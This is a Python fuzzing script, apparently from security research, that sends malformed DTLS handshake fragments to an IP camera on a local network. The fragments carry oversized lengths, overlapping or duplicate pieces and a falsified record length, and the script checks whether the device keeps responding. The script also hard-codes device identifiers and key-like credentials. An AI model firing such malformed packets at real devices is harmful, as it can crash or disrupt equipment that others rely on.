import dtlslib as d, struct, time, os, socket
ENR="O7y73ZL+K47xvSPY"
def new():
    c=d.Cam("192.168.4.24","80482C4BCF0B","S3X2PBBR14M8Y2J6111A",ENR)
    c.open(); c.send(c.pack_record(22,0,0,c.client_hello())); c.recv_dtls(1.0); return c
def hs_rec(c,msg,seq=None,epoch=0):
    return c.pack_record(22,epoch,c.cseq if seq is None else seq,msg)
def frag(t,mseq,body,foff,flen=None,mlen=None):
    flen=len(body) if flen is None else flen; mlen=len(body) if mlen is None else mlen
    return bytes([t])+mlen.to_bytes(3,'big')+struct.pack('>H',mseq)+foff.to_bytes(3,'big')+flen.to_bytes(3,'big')+body
def healthy():
    try:
        c=d.Cam("192.168.4.24","80482C4BCF0B","S3X2PBBR14M8Y2J6111A",ENR); c.open(); c.s.close(); return True
    except Exception: return False
def case(name,payload):
    c=new()
    try: c.send(payload)
    except Exception as e: print(f"{name:50s} SEND-EXC {e}"); return
    try: r=c.recv_dtls(1.5)
    except Exception: r=None
    h=healthy()
    kind="reply" if r else "silence"
    print(f"{name:50s} {kind:8s} healthy={h}")
    c.s.close(); time.sleep(1.2)
print("baseline CH:", bool(new().recv_dtls(1.0))); time.sleep(1.2)
cases=[
 ("mlen 0xFFFFFF flen 12", frag(1,0,b'A'*12,0,mlen=0xFFFFFF)),
 ("mlen 0xFFFFFF flen 12 mseq 9", frag(1,9,b'A'*12,0,mlen=0xFFFFFF)),
 ("foff+flen > mlen", frag(1,0,b'A'*20,0,mlen=10)),
 ("flen 0", frag(1,0,b'',0,mlen=0)),
 ("dup foff sum==mlen", frag(1,0,b'A'*12,0,mlen=12)+frag(1,0,b'B'*12,0,mlen=12)),
 ("overlap sum>mlen", frag(1,0,b'A'*8,0,mlen=12)+frag(1,0,b'B'*8,4,mlen=12)),
 ("partial then rest", frag(1,0,b'A'*6,0,mlen=12)+frag(1,0,b'B'*6,6,mlen=12)),
 ("mseq reuse diff mlen", frag(1,0,b'A'*12,0,mlen=12)+frag(1,0,b'B'*13,0,mlen=13)),
 ("mseq reuse diff type", frag(1,0,b'A'*12,0,mlen=12)+frag(2,0,b'B'*12,0,mlen=12)),
 ("two msgs one record", frag(1,0,b'A'*12,0,mlen=12)+frag(14,1,b'',0,mlen=0)),
 ("trailing 5 bytes", frag(1,0,b'A'*12,0,mlen=12)+b'\x01\x02\x03\x04\x05'),
 ("record len lies big", None),
]
for n in range(0,999,1):
    pass
for name,p in cases:
    if p is None:
        c=new(); m=frag(1,0,b'A'*12,0,mlen=12)
        rec=c.pack_record(22,0,0,m); rec=bytearray(rec); struct.pack_into('>H',rec,11,0xFFFF)
        print(f"{name:50s}", end=" ")
        try: c.send(bytes(rec))
        except Exception as e: print("SEND-EXC",e); continue
        print("reply" if c.recv_dtls(1.5) else "silence", "healthy=",healthy()); c.s.close(); time.sleep(1.2)
    else:
        c=new(); case2=None
        print(f"{name:50s}", end=" ")
        try: c.send(c.pack_record(22,0,0,p))
        except Exception as e: print("SEND-EXC",e); continue
        print("reply" if c.recv_dtls(1.5) else "silence", "healthy=",healthy()); c.s.close(); time.sleep(1.2)
